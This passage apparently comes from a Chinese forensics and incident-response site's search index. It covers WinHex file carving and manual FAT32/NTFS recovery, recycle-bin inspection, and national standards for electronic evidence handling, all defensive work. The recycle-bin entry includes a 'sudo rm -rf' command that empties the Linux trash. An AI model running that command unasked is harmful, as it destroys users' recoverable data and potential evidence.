雕刻（即假定为连续簇），可以取消选择“围绕已用簇在可用簇中雕刻文件”选项。\n选项“Ext2/Ext3块逻辑”使这种恢复方法也偏离了没有碎片的标准假设，因为它将遵循典型的Ext块模式，例如，文件头的第13块被认为是引用以下数据块的间接块。当应用于WinHex知道有Ext2和Ext3以外的文件系统的分区时，或者当发现头没有块对齐时，此选项不起作用。\n日志文件“文件恢复方式”类型.log“有关所选参数和恢复结果的信息将写入输出文件夹以进行验证。\n只需单击相应的按钮，即可在此对话框窗口中展开或折叠整个文件类型树。这很有用，因为展开时只需键入文件类型描述的前几个字符，即可自动跳转到树中的第一个匹配项。\n由于不使用可能存在的（一致或损坏的）文件系统，因此此恢复方法基本上不知道原始文件大小，原始文件名也不知道。这就是为什么生成的文件通常按照以下模式进行命名：Prefix######.ext.“Prefix”是您提供的可选前缀。#####“是每个证据对象的递增数字。”ext”是根据文件类型定义对应于文件头签名的文件扩展名。输出文件名前缀可以选择包含占位符“%d”，该占位符将被驱动器名替换。如果您一次将文件恢复按类型应用于多个驱动器，并且希望能够轻松区分不同驱动器中的文件，则此功能非常有用。\n如果有专家许可证或更高版本，“智能命名”选项将导致Exif JPEG文件以创建它们的数码相机型号及其内部时间戳（如果可用）命名。许多Windows注册表配置单元文件都有其原始名称，还有一些JPEG文件的元数据Photoshop中嵌入了一个名称。没有已知名称且没有Exif元数据的JPEG文件是由已知库创建的，它们会在括号中的人工名称中接收一些附加信息（请参见生成器签名）。拇指.db文件始终命名为拇指.db, 索引.dat总是索引.dat. 上述前缀不能与原始文件名一起使用。\n各种算法在内部工作，试图确定许多不同类型文件的原始大小（其中包括JPEG、GIF、PNG、BMP、TIFF、尼康NEF、佳能CR2 raw、PSD、CDR、AVI、WAV、MOV、MPEG、MP3、MP4、3GP、M4V、M4A、ASF、WMV、WMA、ZIP、GZIP、RAR、7Z、TAR、MS Word、MS Excel、MS PowerPoint、RTF、PDF、HTML、XML、XSD、DTD、PST、，DBX，AOL PFC，Windows注册表，索引.dat，预取，SPL，EVTX，EML）通过检查它们的数据结构。这适用于文件类型定义数据库中页脚列中有“~”的条目。为了使大小和类型检测对这些文件类型起作用，不应更改这些条目。或者，页脚签名也可以帮助查找文件的结尾。对于既不存在内部算法也不存在页脚签名定义的文件，或可用内部算法不知道其原始大小的文件，以及实际找不到页脚签名的文件，将恢复为文件类型定义数据库中指定的默认大小（以字节为单位）。在指定这样的大小时要大方，因为恢复的文件“太大”仍然可以由其关联的应用程序打开，而过早截断的文件通常无法打开，因为它们是不完整的。通过搜索页脚来检测某些类型文件的原始大小的尝试受到大小检测限制，该限制也可以在数据库中指定，位于默认大小和正斜杠之后。这样的限制对于避免在整个卷内搜索给定文件的页脚是必要的，如果卷很大，这将非常耗时。此外，如果右页脚不在页眉附近，则越来越不可能找到右页脚，即使找到的页脚相距很远，这样的文件也可能是碎片或部分被覆盖等。标准默认大小（如果未指定）为1 MB。标准最大大小（如果未指定）是默认文件大小的64倍。\n文件头通常位于集群边界，因为这是文件系统主要放置文件开头的地方。但是，搜索与扇区对齐的文件头更彻底（而不是更慢），因为这样还可以从以前存在的分区中找到具有不同群集布局的文件，因此在扇区边界处搜索是默认行为。如果在没有定义集群布局的物理介质或原始文件上执行，WinHex必须在扇区边界进行搜索。还有另一种可能性，彻底的字节级搜索。当您试图查找在任何扇区边界上没有可靠对齐的文件（例如，备份文件或磁带映像中的文件或嵌入其他文件中的文件）或试图查找条目/记录/微格式/内存工件等（即不完整的普通文件）时，这是必需的。这是以可能增加误报次数为代价的，但是，错误识别的文件签名随机出现在媒体上，并不表示文件的开头。文件类型定义数据库中的单个标志可以帮助确定在每个文件类型的基础上搜索哪些文件的群集、扇区或字节边界。\n卷快照已知的文件的起始扇区始终从文件雕刻中排除是可选的。当然，X-Ways取证通常仍然试图防止重复，但是如果文件头签名定义或内部文件大小检测足够强，表明已知删除的文件被新文件覆盖，那么新文件将被雕刻，尽管它与已知文件共享相同的起始扇区。另一个例外是，在文件头签名搜索中不会忽略完全未初始化文件（有效数据长度=0）的第一个扇区。\n如果您有意中止文件头签名搜索，或者如果文件头签名搜索导致X-Ways Forensics崩溃，则下次在同一证据对象中启动文件头签名搜索时，您将找到一个选项，可以在中断的位置或上次保存卷快照时的位置恢复该搜索发生崩溃（取决于案例的自动保存间隔）。\n如果需要，可以将恢复范围限制为当前选定的块和/或已分配或未分配的空间（逻辑驱动器或卷上提供的选项）。例如，要恢复已删除的文件，请选择仅从未分配的空间恢复。由于文件系统错误而无法访问的文件可能仍存储在被视为正在使用的集群中。\nNTFS压缩对文件数据的影响可以选择在文件头签名搜索（仅限法医许可证）中进行补偿，在许多情况下是成功的。如果找到NTFS压缩文件的签名，则该文件将被标记为已压缩，并且在需要时将尝试“动态”解压缩该文件，该算法甚至可以解压缩由多个压缩单元组成的文件。\n文件类型定义 “文件类型签名*.txt”是以制表符分隔的文本文件，用作优化卷快照和按类型恢复文件命令的文件类型定义数据库。\nWinHex附带了各种预设的文件类型签名。您可以在“文件类型签名”中完全自定义文件类型定义并添加自己的定义搜索.txt“或任何其他格式相同的文件名为“文件类型签名*.txt”，它也将被加载，并且可能有这样的好处：如果它们与默认文件的名称不同，那么在安装下一个更新时它们不会被覆盖。只有当文件名包含单词“search”时，文件类型才可用于文件头签名搜索。否则，它们仅用于已是卷快照一部分的文件的文件类型验证（仅限取证许可证）。总共支持多达4096个条目（1024个用于搜索）。\n单击“自定义”按钮编辑“文件类型签名”文件时搜索.txt，默认情况下，WinHex在MS Excel中打开文件。这很方便，因为该文件包含由制表符分隔的列。如果使用文本编辑器编辑文件，请确保保留这些选项卡，因为WinHex依赖它们的存在来正确解释文件类型定义。MS Excel会自动保留它们。编辑文件类型定义后，需要退出对话框窗口并再次调用“按类型恢复文件”或“优化卷快照”菜单命令，以查看文件类型列表中的更改。\n第1列：文件类型 一种可读的文件类型名称，例如“JPEG”。超过前19个字符的所有内容都将被忽略。\n第2列：扩展 通常用于此文件类型的一个或多个文件类型扩展名。例如“jpg；jpeg；jpe”。首先指定最常用的扩展名，因为默认情况下，该扩展名将用于命名恢复的文件。如果第一个扩展名是用大写字符指定的，则文件类型验证将使用该扩展名填充文件的类型列，即使该文件有一个可选的合理的文件扩展名。支持超过255个字符。\n第3列：标题 唯一的头签名，通过它可以识别此文件类型的文件。它是用GREP语法指定的（请参阅搜索选项以获取解释），因此可以匹配可变字节值（例如，[\\xE1\\xE2]表示“字节值可以是0xE1或0xE2”）或未定义区域（.）。表示的签名的最大长度为48字节。要首先找出特征文件头签名，请在WinHex中打开几个特定类型的现有文件，并在文件开头附近的相同偏移量处查找公共字节值。\n第4列：偏移 文件中签名出现的相对偏移量。通常只是0。签名必须包含在前512字节中。\n第5列：页脚 可选。用GREP语法指定的一种可靠地表示文件结尾的签名（字节序列）。表示可变大小数据的GREP表达式可能无法按预期工作。页脚签名可能有助于实现具有正确文件大小的恢复。恢复算法不会从页眉开始搜索超过指定为最大文件大小的字节数的页脚。\n甚至比页脚更好的是，XWays Forensics内部实现的算法的潜在可用性，该算法非常了解文件格式，如果文件没有碎片、不完整或损坏，通常可以找出正确的文件大小。这种算法在页脚列中用波浪号（~）和算法ID号表示。\n第6列：默认大小 可选。1或2个值。如果有两个值，则第二个值是特定于文件类型的大小检测限制，并用正斜杠与默认大小分隔。\n第7列：旗帜 可选。可以进一步定制特定文件类型的文件雕刻，是另一个如何复杂和强大的文件雕刻在X-Ways取证指标。\n答：这意味着一个定义严重依赖于相关的算法（用~字符定义的算法），没有它就太通用了。\nb（小写）：在给定选项时，在字节级搜索签名。特别适用于通常不在任何扇区或集群边界对齐的条目/记录/微格式/内存工件（即不完整的普通文件）。\nB（大写）：出于性能原因，阻止对特定签名进行字节级搜索。\nc（小写）：如果考虑（取决于用户界面设置），则忽略在集群边界处未对齐的头签名。对于某些文件类型可能很有用，以避免许多误报。\nC（大写）：表示不应用于搜索NTFS压缩文件的文件类型签名（如果NTFS压缩补偿处于活动状态），因为它们太弱，会产生太多误报，或者实际上不会存储为压缩文件。\nd（小写，表示“direct”）：签名将按字面解释，而不是按GREP表达式，逐字符解释，字节值根据Windows系统中的活动代码页。例如，如果您对GREP表示法不是很熟悉，或者不需要GREP，只想根据Windows系统中活动的代码页对所有字符进行逐字解释，而不必考虑字符在GREP中是否被视为特殊字符，那么这将非常有用。例如，\u003c？xml version=“1”是某些xml文件的有效签名，但它仅与direct标志一起使用，因为问号在GREP中有特殊的含义，如果整个表达式被解释为GREP，则会在内部为签名生成不同的字节值序列；如果GREP解释处于活动状态，则不会生成任何匹配项。\ne:代表“嵌入式”。如果某个文件类型在页脚列中具有波浪号（~）算法，并用此标志进行了标记，则在卷快照优化期间，在“在上面未处理的所有文件中搜索文件头签名”部分中，将预先选择该文件类型以搜索某些其他文件中的嵌入数据。“e”标志仅帮助初始化此选项的记号。最终，用户可以在用户界面中更改该操作的选定文件类型。此外，将搜索嵌入到不存在内部提取算法的类型文件中的标有“e”标志的类型。\nE:从不在其他文件中作为嵌入文件进行雕刻。\nf（小写）：表示指定的页脚签名用于查找不再属于文件的一部分且应排除的数据。普通的页脚包含在雕刻文件中。对于没有良好定义的页脚的文件格式非常有用，在这种格式中，可以通过出现不再属于该文件的数据来检测文件的结尾。这可以是与头相同的签名（如果该类型的文件通常以组的形式出现，则是背对背的），也可以是\\x00（对于不包含零值字节的文本文件等文件格式，其中\\x00在RAM slack中的可能性很高）。此类页脚签名应标记为独占，因为与其匹配的数据不是文件本身的一部分。\nF（大写）：如果在定义中指定了页脚签名，则如果找不到相应的页脚，则使X-Ways取证放弃对文件头签名搜索的命中。有助于减少或完全避免误报。\n代表“贪婪”。贪婪地分配所有的部门。文件类型签名搜索仅在假定的文件结束后继续搜索其他文件头。如果有一个内部实现的算法可以确保雕刻的文件包含所有有效的数据，这样就不必在先前雕刻的文件的边界内搜索其他文件，那么这个算法将非常有用。只有在扇区边界处找到文件头签名时，该标志才有效。如果空闲空间中的文件是围绕分配的集群划分的，则在搜索进一步的文件头签名时，只跳过文件的第一个片段。\ng（小写）：同一标志的较弱版本。只有当文件类型存在内部文件大小检测算法，并且具有相同起始扇区号的文件已经存在，并且具有与检测到的相同的文件大小时，“g”标志才会导致X-Ways取证跳过受影响的扇区。这有助于防止zip文件重叠，从而避免可能包含许多重复文件。\nh：表示指定的头签名用于查找不属于文件本身的数据。这意味着头签名将从雕刻文件中排除。雕刻文件将在头签名后开始。此外，此标志防止在为此类文件分配的群集周围的可用空间中进行文件雕刻。\nH:该定义仅用于签名突出显示功能，不用于常规的文件头签名搜索或文件类型验证。这样的定义只需要三条信息：关键字或GREP表达式、相对偏移量（通常为0）和标志“H”。行开头的描述是可选的，但建议使用，因为颜色取决于描述，对于不同的描述，您可能会看到不同的颜色。您甚至可以创建一个专用的文本文件，例如名为“文件类型签名搜索”突出显示.txt，它定义了各种您始终感兴趣的关键字或GREP表达式，并希望在每次运行适当的搜索之前立即突出显示这些关键字或表达式。如果您分析或逆向工程文件格式，例如记录没有固定长度（因此WinHex中的记录表示选项不适用），但可以通过签名来识别，也很有用。\nL:标识仅链接到其他定义的链接。例如，有一个OpenOffice文件条目很有用，但有些用户没有该条目，如果缺少该条目，可能会导致错误的想法，即无法雕刻OpenOffice文件。如果选择了OpenOffice的条目进行雕刻，则会在内部自动选择zip存档进行雕刻，这是有意义的，因为从技术上讲，OpenOffice文件是zip文件，可以这样雕刻。缺点是其他不是OpenOffice文件的zip文件也会被雕刻。\n但是，由于内部文件类型检测（例如基于自动分配的文件扩展名），这些文件将是可区分的。\nS：标记足以用于文件头签名搜索（可能与雕刻算法结合使用）的签名，但由于偶尔的错误识别而不能用于文件类型验证。这个旗子应该很少需要。\nt:防止X-Ways取证人员在确认后立即呈现雕刻文件的类型。例如，对于XML等文件格式族非常有用，可以在以后的文件类型验证过程中确定确切的子类型。\nu（小写）：表示“未使用”。允许雕刻文件只在集群是免费的，根据文件系统。\nU（大写）：仅允许在集群中雕刻文件，这些集群根据文件系统是免费的，并且卷快照中包含的以前存在的文件也不使用这些集群。\nW（大写）：标识头签名，这些头签名太弱，无法新检测文件的类型，仅用于确认文件扩展名建议的类型。\nx:标识实际文件扩展名不是该文件类型的标准扩展名这一相对正常的文件类型，这样在文件类型验证后，这些类型的文件不会突出显示为“检测到不匹配”，而只是显示为“新标识”，以免引起人们对这些文件的过分关注。\ny：标识已知在内部使用加密的文件类型，允许在Attr中标记这些类型的雕刻文件。立即用“e！”列。\n手动数据恢复 可以恢复丢失或逻辑删除的文件（或更一般的：数据），这些文件在文件系统中仅标记为已删除，但尚未被物理擦除（或覆盖）。\n使用磁盘编辑器打开已删除文件所在的逻辑驱动器。基本上，您可以通过选择分配给文件的磁盘扇区作为当前块并使用菜单命令“编辑|复制块|保存到新文件”来重新创建这样的文件。但要找到文件仍然存储的扇区可能很困难。通常有两种方法来实现这一点：\n\\1. 如果您知道要查找的文件的某个片段（例如JPEG文件头中的特征签名或MS Word文档中的“亲爱的史密斯先生”），请使用其中一个搜索命令（例如“查找文本”或“查找十六进制值”）在磁盘上搜索它。这是一个非常简单和可靠的方法。\n\\2. 如果您只知道文件名，则需要了解磁盘上的文件系统（FAT16、FAT32、NTFS…），以便找到以前的目录条目或定义文件的其他数据结构的痕迹，从而确定分配给文件的第一个群集的数目。\n您可能会遇到这样的问题：要恢复的文件是碎片化的，即没有存储在后续连续的集群中。在FAT文件系统中，可以在驱动器开头的文件分配表中查找文件的下一个群集，但删除文件时会删除此信息。\n手工数据恢复案例 这里我们参考https://www.jianshu.com/p/88a9ea4055c7\nFAT32 FAT32逻辑磁盘基本信息描述 用winhex打开一个FAT32分区格式的逻辑盘F盘，查看该逻辑盘的根目录区。\n逻辑盘BPB\n其中0200（蓝框）表示一个扇区512个字节，08（红框）表示每簇8个扇区，即每簇4kb。（查阅资料可得，FAT32分区当分区大小在260MB-8GB时，簇大小为4KB，符合事实）这里由F盘大小5GB及在FAT表中每簇占4个字节的记录可计算得每个FAT（FAT2为FAT1的备份）大小为5MB，与实际相同。\n在F盘根目录下创建一个大概60kb的文本文档。\n创建文件\n在winhex找到该文件位置，查看目录项的信息。\n文件目录项\n由红框内目录项信息可分别知道首簇号高四位和第四位进而求得首簇号为10号，以及文件大小。经计算可得文件大小为58.9kb近似为文件大小。又因为每簇4kb，故共需15簇。\nfat1（正常）\n从第10号开始，形成一个簇链，直到FFFFFF0F结束。\nFAT32数据恢复过程 将刚才的test.txt文件永久删除。\n删除文件\n找到文件目录项，修改对应第一位信息，并由目录项簇号信息及文件大小计算出首簇号为10，簇数为15。\n修改第一位\n分别将FAT1和FAT2的信息进行修改，从10号开始填补簇链到15个簇被填满，其中最后一个以FFFFFF0F结尾。\nfat1（恢复）\n保存后发现文件已恢复，内容完整。\n恢复成功\n至此，FAT32文件恢复已完成。\nNTFS NTFS数据恢复过程 同样，先在NTFS格式的E盘创建一个文本文档，再使用shift+delete进行删除。\n创建文件.png\n打开$MFT元文件。\n查找文件名test的位置（MFT文件名是unicode形式），找到对应的MFT。\n查找.png\n文件MFT.png\n16H为00H说明该文件被删除，系统根据这个标志来决定建立新文件时是否覆盖这个MFT而创建自己的MFT。\n再向下找到80H处，往后八个字节为01，则找到相对80H处30H的EE0D00即0DEE为文件大小，经计算为3.48kb基本符合。再向后偏移10H，31表示往后一个字节01H为簇数1，再后三个字节638002即28063H为首簇号，换算成十进制为163939。\n文件属性.png\n选中$MFT元文件，根据刚才得到的簇号转到文件数据存储扇区。\n转到扇区1.png\n转到扇区2.png\n将起始位置设为起始点，根据文件大小0DEE算出数据结尾处转到当前位置偏移，再设为终止点，即可选中所有数据。\n选中数据区域.png\n转到终止点.png\n选中数据选择复制导入到新文件，我们选择恢复到E盘（其实最好不应选择恢复到原文件盘，但因无其他数据，经试验此次无影响），即可完成文件恢复。\n生成文件.png\n使用记事本打开发现数据已恢复无误。\n恢复成功.png\n至此，NTFS文件删除后恢复已完成。\n参考资料：\n(NTFS部分）\nhttp://www.webkaka.com/info/archives/system/2015/05/282147/\nhttp://www.webkaka.com/info/archives/system/2015/05/282148/\n",
    "description": "",
    "tags": null,
    "title": "WinHEX(win)",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/WinHEXwin/index.html"
  },
  {
    "content": "竹林中的一处小屋🛖，种植着大量的竹子，如果你需要那就多逛逛竹林吧，希望日后你也能多多种植属于你的竹子。\n当你的才华还撑不起你的野心的时候，你就应该静下心来学习；当你的能力还驾驭不了你的目标时，就应该沉下心来，历练；梦想，不是浮躁，而是沉淀和积累，只有拼出来的美丽，没有等出来的辉煌，机会永远是留给最渴望的那个人，学会与内心深处的你对话，问问自己，想要怎样的人生，静心学习，耐心沉淀，送给自己，共勉。——莫言\n世界上有许多事情必须做，但你不一定喜欢做，这就是责任的涵义。如果他要进行选择，他也总是必须在他的生活范围里面、在绝不由他的独自性所造成的一定的事物中间去进行选择的。——马克思\n",
    "description": "",
    "tags": null,
    "title": "关于",
    "uri": "/%E5%85%B3%E4%BA%8E/index.html"
  },
  {
    "content": "windows下回收站文件 查询回收站内容 通过$RECYCLE.BIN+sid查询回收站内容。可以看到查到的文件名称展示都非原始文件名。\n通过dir /s /a c:$Recycle.Bin列出所有回收站中的文件，这里测试发现，当前用户的这个回收站展示的文件名并非原始文件名，而是经过重命名的文件。\n快速打开回收站：\nstart shell:RecycleBinFolder\nlinux下回收站文件 linux下回收站的位置 ~/.local/share/Trash/\nsudo ls -l ~/.local/share/Trash/file* # 列出所有回收站的文件 sudo rm -rf ~/.local/share/Trash/* # 删除回收站的文件",
    "description": "",
    "tags": null,
    "title": "回收站文件检查",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E5%9B%9E%E6%94%B6%E7%AB%99%E6%96%87%E4%BB%B6%E6%A3%80%E6%9F%A5/index.html"
  },
  {
    "content": "应急/司法举证关注什么？国标对于电子取证有哪些明确要求？\n在进行下面之前，我们需要了解下现行国家标准中提及的有关取证需要关注重要点。这里我们参考的国标有：\nGB/T 29360-2012 《电子物证数据恢复检验规程》 GB/T 29361-2012 《电子物证文件一致性检验规程》 GB/T 29362-2012 《电子物证数据搜索检验规程》 GB/T 31500-2015 《信息安全技术 存储介质数据恢复服务要求》 GB/T 39321-2020 《电子合同取证流程规范》即将实施状态 电子物证文件一致性检验规定 参考GB/T 29361-2012 《电子物证文件一致性检验规程》相关内容。\n软件工具要求： 要有具有计算哈希值功能的软件\n操作步骤规定： 检材及样本编号：对送检的检材（样本）进行唯一性编号；\n检材及样本拍摄：对送检的检材（样本）加上唯一性编号进行拍照\n检验\n启动杀毒软件对物证检验工作站系统进行杀毒 将检材数据文件和样本数据文件进行保全 使用软件工具分别计算检材数据文件和样本数据文件的哈希值 哈希值的计算方法按照软件工具使用说明书进行操作 比较检材数据文件和样本数据文件的哈希值。两个哈希值相同，则可以判断两个文件的数据相同；两个哈希值不同，则可以判断两个文件的数据不同。 检验结论的表述 经对编号为“n”的检材与编号为“m”的样本使用rr软件工具进行技术检验后，两个文件的数据相同（或不同），其HH哈希值分别为：\na）编号为“n”检材的哈希值：hhn；\nb）编号为“m”样本的哈希值：hhm；\n数据恢复相关规定 参考GB/T 29360-2012 《电子物证数据恢复检验规程》\n软件工具要求： 具有数据恢复功能的软件\n操作步骤规定： 检材及样本编号：对送检的检材（样本）进行唯一性编号\n检材及样本拍照：对送检的检材（样本）加上唯一性编号进行拍照\n检材及样本保全备份：对具备保全条件的检材（样本）进行保全备份\n检验\n启动杀毒软件对电子物证检验工作站系统进行杀毒 将检材（若已保全，使用保全的存储设备）通过只读方式连接到电子物证检验工作站 计算检材（样本）的哈希值 根据检验要求，使用软件工具进行数据恢复 恢复数据文件方法应按照软件工具使用说明书进行操作 将恢复的数据进行筛选后复制到检验专用存储介质中 检出数据刻录\n将检出数据刻录在不可擦写的空白光盘上，应采用封盘刻录 计算光盘的哈希值 对光盘进行唯一性编号 贴上盘签。盘签应注明检验单位名称、光盘编号、光盘哈希值、光盘制作日期等；应加盖检验鉴定专用章 检验结论的表述\n经对编号为“al”至“an”的检材使用rr软件工具进行技术检验，检验结果如下：\n在检材ai中检出与yy有关数据文件mm个，大小合计bb。检出的数据文件刻录在编号为gg光盘中，该光盘的HH哈希值为hh。\n数据恢复服务规定： 术语与定义注意： 硬件故障：由于存储介质硬件损坏而造成数据无法访问的故障，一般是指电路故障、机械故障、固件故障、存储介质缺陷等。 软件故障：由于存储介质中用户数据损坏而造成数据无法访问的故障，一般是指操作系统故障、应用软件故障、用户误操作、计算机病毒破坏等 开盘修复：打开硬盘盘体或拆取存储芯片，排除存储介质硬件故障的操作 数据销毁：使用覆盖、消磁等技术手段，清除存储介质上所有数据的操作 服务条件要求 从业机构 从业机构应符合如下要求：\na）应具有合法经营资格和专业的技术团队\nb）应制定管理只读并采取防止数据泄露的技术措施保护客户数据安全\n从业人员 从数据恢复服务的人员应具备如下条件\na）遵守管家法律法规，与从业机构签署劳动合同和保密协议，承担保密义务\nb）具有良好的计算及应用知识，熟悉计算机系统结构、数据存储原理等专业知识\nc）实施存储介质软件故障恢复的技术人员应账务各种高应用操作系统、文件系统的基础理论知识和相关软件和设备使用方法，具有处理软件故障的能力\nd）实施存储介质硬件故障恢复的技术人员应掌握各类电路板、硬盘结构、存储芯片的基础理论知识和相关软件和设备使用方法，具有处理硬件故障的能力。\n服务场所及机房\n服务场所 数据恢复服务机构应具有独立的、面积适宜的、配备相关设备和消防设施的服务场所；应根据不同的功能划分相互独立的客户接待区、机房和管理办公区。 机房 数据恢复服务机构应具备独立的机房，专门用于数据恢复的技术实施。实施硬盘开盘操作应当在不低于六级洁净登记的洁净环境中进行。洁净环境建设应按照GB 50073-2001，机房建设要求应按照GB 50174-2008. 设备配置\n表1数据恢复服务软、硬件工具基本配置要求\n序号 工具类别 配置要求 1 数据恢复工作专用计算机及配套设备 a)配置基本的正版操作系统和正版软件工作环境及必要的硬件配套设备;b)写保护设备必须有明确的写保护方向标识必备 2 数据镜像工具 必须具有写保护功能,或该工具的物理接口可以与写保护设备相连必备 3 数据销毁工具 必须支持逐比特数据覆盖功能必备 4 软件操作工具 配置正版的软件工具,包括文件系统恢复工具、数据文件恢复工具、十六进制编辑工具等必备 5 备件 应具备可用于硬件故障恢复的,可替代存储介质故障部分的零部件等备品备件硬件故障恢复必备 6 硬件操作工具 洁净工作台、显微镜、开盘工具、焊接设备、固件操作工具、万用表等硬件故障恢复必备 服务过程要求 概述 存储介质数据恢复的实施过程可氛围介质接收、介质检测、数据恢复、数据交付、数据销毁5个主要环节，其主要工作内容包括：\na）介质接收：接收存储介质并记录存储介质情况\nb）介质检测：判断存储介质故障类型，制定数据恢复方案\nc）数据恢复：排除存储介质故障，提取可用数据\nd）数据交付：将数据恢复结果交付给客户\ne）数据销毁：销毁数据恢复结果和数据恢复过程中产生的所有相关数据信息。\n上述各环节负责人应对操作及结果进行记录并签字。\n介质接收 介质接收环节的实施要求如下：\na）检查送修存储介质，记录其基本情况，包括类型、品牌、幸好、序列号及外观特征\nb）指导客户描述送修存储介质的故障现象，包括故障出现前后的操作、故障表现，并记录上述信息\nc）指导客户描述需要恢复的数据特征，并记录上述信息\nd）告知客户数据恢复实施的相关风险及结果、客户及数据恢复服务机构的职责\ne)客户与数据恢复服务机构应签署服务协议,协议基本内容包括存储介质的基本情况、修复需求、修复风险及各方责任和义务。\n介质检测介质检测环节的实施要求如下:\n检测送修存储介质故障类型,判断本机构是否具备实施条件,若不具备实施条件,应中止数据恢复操作并返还给客户送修存储介质,并对客户说明无法实施的原因; 对于具备实施条件的,应根据故障类型制定恢复方案,方案包括技术路线、使用方法、软硬件工具、人员时间安排和操作方法等。 数据恢复数据恢复环节的实施要求如下:\n根据存储介质检测结果实施数据恢复操作,需要实施硬盘开盘操作应获得客户书面授权,并在符合要求的洁净环境中实施; 当存储介质可正常读取后,采用写保护措施对原始存储介质实施镜像,镜像完成后,软件故障的排除需要在镜像数据上进行; 恢复出的可用数据需保存在专用数据存储设备中,不得覆盖镜像数据或客户的原始数据; 实施远程数据恢复时,双方均需在符合本标准机房要求的环境中进行,并由专人相互配合,共同完成数据恢复技术操作; 实施远程数据恢复时,需采取保证系统安全及信息传输安全的技术措施; 应对原始数据进行保护,不得更改和删除原始存储介质上的数据。 数据交付数据交付环节的实施要求如下:\n数据恢复实施方案完成后,需根据客户描述确认数据的可用率,并将结果如实告知客户,由客户对恢复结果进行确认; 将数据恢复结果按照客户指定方式进行数据交付; 数据交付时,应完整归还客户送修的存储介质。 数据销毁数据销毁环节实施要求数据交付完成后,应根据协议约定及时销毁数据恢复结果及操作过程中产生的所有相关数据信息。\n服务管理要求 人员人员管理要求:\n人员管理应当权责分明,对所有人员定岗定责; 数据恢复服务机构有义务对员工进行职业道德教育和技能培训,每年至少两次,并对培训过程及结果进行记录。 设备数据恢复设备管理要求:\n应建立设备维护和管理制度; 所有设备应做到专机专用,不得安装使用与数据恢复无关的应用程序; 在数据恢复过程中,除用于远程数据恢复的计算机外,其他设备不得连接互联网; 未经批准,不得改变现有设备的配置。对软硬件配置的重大变更,应先形成方案文件,经讨论并获得相关负责人批准后,由具备资格的技术人员进行更改,并保留更改和操作记录; 未经批准,不得在现有设备网络中加入外来移动存储介质; 未经批准,不得将存储介质带出机房; 通过网络传输的数据文件需要经过加密; 专用设备只能由指定人员进行操作; 定期检测设备运转情况,进行必要的升级维护,保障设备运转正常。 机房机房管理要求:\n机房应安装门禁系统,只允许数据恢复工作人员进入,其他人员进入需要经过审批; 机房应安装录像监控系统,监控范围应覆盖整个机房,且录像记录应至少保存1个月; 机房应对不同功能区域进行物理划分,并建立访问登记制度; 确定责任人定期检查机房设备设施的运转情况,查验相关日志信息,及时排查故障隐患; 机房内的资料、数据、配置参数等信息应妥善保管,未经批准不得以任何形式提供给其他无关人员。 存储介质存储介质管理要求:\n存储介质管理包括客户盘、工作盘、备件盘; 存储介质管理应遵循易取易存原则,集中存放、分类管理,应建立专用的存储介质库并安排专人管理; 应建立存储介质档案,对存储介质逐一编号,详细记录其品牌、型号、容量、序列号及性能等信息; 客户存储介质应粘贴唯一性标签,同一工作单的客户存储介质应集中放置一处,并在专门防磁、防静电的存储环境中保存; 存储介质管理员负责对存储介质库的维护和管理工作,应建立出入库登记制度,并定期盘点。 质量控制\n抽查 应制定并实行质量抽查制度,按月对数据恢复进度和结果以及服务承诺进行抽查,抽样数量不低于当月总业务量的5%,抽查结果应详细记录。 投诉处理 应建立良好的投诉处理机制: 应在网站和服务场所显著位置公布投诉电话,为客户提供投诉渠道,包括邮件、电话、信函和面谈等形式; 接受客户投诉时,需记录并核对如下信息:投诉人的姓名、地址和联系方式、投诉的原因、目的、要求等投诉细节; 受理投诉后,应核实投诉人所叙述的投诉细节是否属实,对于投诉属实的应确定相关事件责任人,并组织整改。 客户回访数据恢复服务完成后,应对客户进行回访,了解数据恢复服务质量,并根据回访情况实行服务改进。 电子证据检索规定 参考GB/T 29362-2012 电子物证数据搜索检验规程 中提到了关于电子物证数据检索的规定：\n术语定义注意： 文件搜索：根据已知内容或关键字对送检存储设备或介质的数据文件进行搜索检验； 物理搜素：根据已知内容或关键自对送检存储设备或介质的二进制数据进行搜索检验； 保全备份：对原始数据进行完整、精确、无损的备份。 电子物证数据搜索检验仪器设备要求： 硬件上存储介质、保全备份设备、具有只读接口的电子物证检验工作站； 软件要求具有数据搜索功能的软件、操作系统提供的资料（文件）管理器等。 对于操作步骤的要求： 检材及样本编号：对送检的检材（样本）进行唯一性编号；\n检材及样本拍照：对送检的检材（样本）加上唯一性编号进行拍照；\n检材及样本保全备份：对具备保全条件的检材（样本）进行保全备份\n检验：\n启动杀毒软件对电子物证检验工作站系统进行杀毒 将检验（样本）（若已保全，使用保全的存储设备）通过只读方式链接到电子物证检验工作站 计算检材（样本）的哈希值 根据检验要求，使用软件工具进行文件搜索或物理搜索 搜索数据应按照软件工具使用说明书进行操作 将搜索结果按检验要求筛选后复制到检验专用存储 检出数据刻录： 将检出数据刻录在不可擦写的空白光盘上，应采用封盘刻录 计算光盘的哈希值 对光盘进行唯一性编号 贴上盘签。盘签内容应注明检验单位名称、光盘编号、光盘哈希值、光盘制作日期等；应加盖检验鉴定专用章 检验结论的表述： 经对编号为“ai”～“an”的检材使用rr软件工具进行技术检验，检验结果如下：\n在检材ai中检出与yy有关数据文件mm个，大小合集bb。检出的数据文件刻录在编号为gg光盘中，该光盘的HH哈希值为hh。（或在检材ai中未检出与yy有关的数据文件。）\n结论综述： 从国标的技术要求和规定来看，可以看到国标中对电子取证的规范性、权威性提出了一定的要求和规定，尤其是数据恢复服务资质、条件，电子证物的保全、证据检索固定的规范做了比较明确的规定。而对于软件工具的具体产品型号并没有强制的限定。\n根据国标的规定，还可以看出电子证物的取证分析数据恢复等，是一系列非常严谨的工作，需要占用和消耗大量的时间和精力规划和布局相关工作流程，相关人员培养。\n因此，对于日常安全运营，我们更多的是参考行业对于应急响应专项排查中提到相关重点内容排查方法进行排查。没有相关资质和经验的个人和公司，并不能胜任司法级别的电子取证固定工作。\n",
    "description": "",
    "tags": null,
    "title": "国标中电子取证相关要求及综述",
